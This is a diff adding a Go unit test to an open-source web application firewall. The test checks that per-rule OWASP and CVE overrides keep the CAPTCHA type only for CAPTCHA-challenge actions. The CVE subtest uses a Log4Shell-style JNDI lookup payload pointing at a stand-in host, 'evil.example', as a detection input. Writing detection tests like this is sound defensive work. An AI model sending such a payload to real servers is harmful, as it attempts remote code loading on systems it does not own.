@@ -9,6 +9,7 @@ import (
 	"My-OpenWaf/internal/core/pipeline"
 	"My-OpenWaf/internal/store"
 	"My-OpenWaf/internal/waf/cve"
+	"My-OpenWaf/internal/waf/owasp"
 )
 
 var benchmarkCVEPhaseResult action.Result
@@ -632,6 +633,78 @@ func TestCVEDetectorPatternOverridePreventsAutoDrop(t *testing.T) {
 	if result.Type != action.RateLimit {
 		t.Fatalf("expected pattern override action to win, got %q", result.Type)
 	}
+}
+
+func TestOWASPAndCVERuleOverridesCarryCaptchaType(t *testing.T) {
+	t.Run("owasp", func(t *testing.T) {
+		cfg := store.DefaultProtectionConfig()
+		cfg.OWASPAction = "intercept"
+		hit := owasp.OWASPHit{
+			Category: owasp.CatSQLi,
+			RuleID:   "owasp:sqli:001",
+			Score:    5,
+			Desc:     "test hit",
+		}
+		result := owaspHitResult(hit, &cfg, map[string]owasp.OWASPRuleOverride{
+			hit.RuleID: {Action: "captcha_challenge", CaptchaType: "slide"},
+		})
+		if result.Type != action.CaptchaChallenge || result.CaptchaType != "slide" {
+			t.Fatalf("OWASP result=%#v want captcha_challenge/slide", result)
+		}
+		result = owaspHitResult(hit, &cfg, map[string]owasp.OWASPRuleOverride{
+			hit.RuleID: {Action: "intercept", CaptchaType: "slide"},
+		})
+		if result.Type != action.Intercept || result.CaptchaType != "" {
+			t.Fatalf("OWASP non-CAPTCHA result retained captcha_type: %#v", result)
+		}
+	})
+
+	t.Run("cve", func(t *testing.T) {
+		cfg := store.DefaultProtectionConfig()
+		cfg.CVEEnabled = true
+		rawQuery := "x=${jndi:ldap://evil.example/a}"
+		request := cve.BuildCVERequest("/", rawQuery, map[string]string{}, nil, "")
+		matches := cve.NewCVEDetector().Detect(request)
+		if len(matches) == 0 {
+			t.Fatal("expected CVE detector match")
+		}
+		overrides := make(map[string]cve.CVERuleOverride, len(matches))
+		for i := range matches {
+			overrides[matches[i].Pattern] = cve.CVERuleOverride{
+				Action:      "captcha_challenge",
+				CaptchaType: "rotate",
+			}
+		}
+		rawOverrides, err := json.Marshal(overrides)
+		if err != nil {
+			t.Fatalf("marshal CVE overrides: %v", err)
+		}
+		cfg.CVERulesConfig = string(rawOverrides)
+		result, stop := NewCVEPhase(&cfg, cve.NewCVEDetector()).Execute(&pipeline.RequestCtx{
+			Path:     "/",
+			RawQuery: rawQuery,
+			Headers:  map[string]string{},
+		})
+		if !stop || result.Type != action.CaptchaChallenge || result.CaptchaType != "rotate" {
+			t.Fatalf("CVE result=%#v stop=%v want captcha_challenge/rotate", result, stop)
+		}
+		for key := range overrides {
+			overrides[key] = cve.CVERuleOverride{Action: "intercept", CaptchaType: "rotate"}
+		}
+		rawOverrides, err = json.Marshal(overrides)
+		if err != nil {
+			t.Fatalf("marshal non-CAPTCHA CVE overrides: %v", err)
+		}
+		cfg.CVERulesConfig = string(rawOverrides)
+		result, stop = NewCVEPhase(&cfg, cve.NewCVEDetector()).Execute(&pipeline.RequestCtx{
+			Path:     "/",
+			RawQuery: rawQuery,
+			Headers:  map[string]string{},
+		})
+		if !stop || result.Type != action.Intercept || result.CaptchaType != "" {
+			t.Fatalf("CVE non-CAPTCHA result retained captcha_type: %#v stop=%v", result, stop)
+		}
+	})
 }
 
 func TestCVEDisabledRuleOverridePassesWhenAllMatchesDisabled(t *testing.T) {
